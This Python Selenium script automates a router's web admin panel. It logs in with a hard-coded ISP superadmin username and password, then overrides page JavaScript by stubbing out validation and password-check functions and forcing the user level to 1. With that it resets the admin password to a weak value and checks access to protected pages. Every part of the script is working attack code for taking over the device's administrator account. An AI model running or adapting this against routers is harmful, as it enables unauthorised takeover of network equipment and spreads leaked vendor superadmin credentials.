#!/usr/bin/env python3
"""Quick check: is the router locked out? And re-login as superadmin."""
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import os, time

ROUTER = "https://192.168.1.1"

def setup_driver():
    opts = Options()
    opts.add_argument("--headless=new")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--ignore-certificate-errors")
    opts.add_argument("--window-size=1280,720")
    for p in [r"C:\Program Files\Google\Chrome\Application\chrome.exe",
              r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"]:
        if os.path.exists(p):
            opts.binary_location = p
            break
    driver = webdriver.Chrome(options=opts)
    driver.set_page_load_timeout(15)
    return driver

driver = setup_driver()
try:
    # Check admin.html page for lockout status
    driver.get(f"{ROUTER}/admin.html")
    time.sleep(4)

    # Read page variables
    info = driver.execute_script("""
        return {
            LoginTimes: window.LoginTimes,
            LockLeftTime: window.LockLeftTime,
            FailStat: window.FailStat,
            CfgMode: window.CfgMode,
            errloginlockNum: window.errloginlockNum,
            Userlevel: window.Userlevel,
            preflag: window.preflag,
        };
    """)
    print(f"Page state: {info}")

    # Check if login form is still visible
    has_login = "txt_Username" in driver.page_source
    print(f"Has login form: {has_login}")

    if has_login:
        # Check if fields are disabled
        disabled_user = driver.execute_script("return document.getElementById('txt_Username').disabled;")
        disabled_btn = driver.execute_script("return document.getElementById('button').disabled;")
        print(f"Username disabled: {disabled_user}")
        print(f"Button disabled: {disabled_btn}")

        # Try to check the error message
        err_div = driver.execute_script("var el = document.getElementById('DivErrPage'); return el ? el.innerHTML : 'not found';")
        print(f"Error div: {err_div}")

    # Try to login as superadmin
    if has_login and not disabled_user:
        print("\nAttempting superadmin login...")
        user = driver.find_element(By.ID, "txt_Username")
        pw = driver.find_element(By.ID, "txt_Password")
        driver.execute_script("arguments[0].value='';", user)
        driver.execute_script("arguments[0].value='';", pw)
        user.send_keys("adminpldt")
        pw.send_keys("AC2DIU7QW3ERTY6UPAS4DFG")
        driver.execute_script("window.setDisable = function() {}; document.getElementById('button').style.display = '';")
        driver.find_element(By.ID, "button").click()
        time.sleep(5)

        url = driver.current_url
        level = driver.execute_script("return window.Userlevel;")
        print(f"After login URL: {url}")
        print(f"Userlevel: {level}")

        has_login2 = "txt_Username" in driver.page_source
        print(f"Has login form: {has_login2}")

        # Check visible text
        text = driver.execute_script("return document.body ? document.body.innerText.substring(0, 1000) : '';")
        print(f"Text: {text[:500]}")

        if level == 2 or (not has_login2 and "admin" in url.lower()):
            print("\nSuperadmin login successful!")

            # Step 2: Fill form and force Userlevel=1
            print(f"\nFilling password change form...")
            driver.execute_script("document.getElementById('old_password').value = 'AC2DIU7QW3ERTY6UPAS4DFG';")
            driver.execute_script("document.getElementById('new_password').value = 'Admin9999';")
            driver.execute_script("document.getElementById('confirm_password').value = 'Admin9999';")
            driver.execute_script("window.Userlevel = 1;")
            driver.execute_script("window.CheckParameter = function() { return true; };")

            level_after = driver.execute_script("return window.Userlevel;")
            print(f"Userlevel after override: {level_after}")

            # Click Update
            print("Clicking Update...")
            driver.find_element(By.ID, "button_update").click()
            time.sleep(6)

            url2 = driver.current_url
            text2 = driver.execute_script("return document.body ? document.body.innerText.substring(0, 500) : '';")
            print(f"After update URL: {url2}")
            print(f"Text: {text2[:300]}")

            # Check if admin login works now
            print("\nVerifying admin:Admin9999...")
            driver.get(f"{ROUTER}/login.asp")
            time.sleep(3)

            lockout = driver.execute_script("return window.LockLeftTime;")
            print(f"LockLeftTime: {lockout}")

            u = driver.find_element(By.ID, "txt_Username")
            p = driver.find_element(By.ID, "txt_Password")
            driver.execute_script("arguments[0].value='';", u)
            driver.execute_script("arguments[0].value='';", p)
            u.send_keys("admin")
            p.send_keys("Admin9999")
            driver.execute_script("window.CheckPassword = function() { return 0; }; window.setDisable = function() {};")
            driver.execute_script("document.getElementById('button').style.display='';")
            driver.find_element(By.ID, "button").click()
            time.sleep(4)

            url3 = driver.current_url
            has_login3 = "txt_Username" in driver.page_source
            print(f"admin:Admin9999 -> URL: {url3}, login: {has_login3}")

            if not has_login3:
                driver.get(f"{ROUTER}/html/amp/wlanbasic/WlanBasic.asp?2G")
                time.sleep(3)
                ok = "txt_Username" not in driver.page_source
                print(f"Protected page OK: {ok}")
                if ok:
                    print("*** ADMIN PASSWORD CHANGED! admin:Admin9999 ***")
    else:
        print("Login form is disabled or not found - may be locked out")

finally:
    driver.quit()
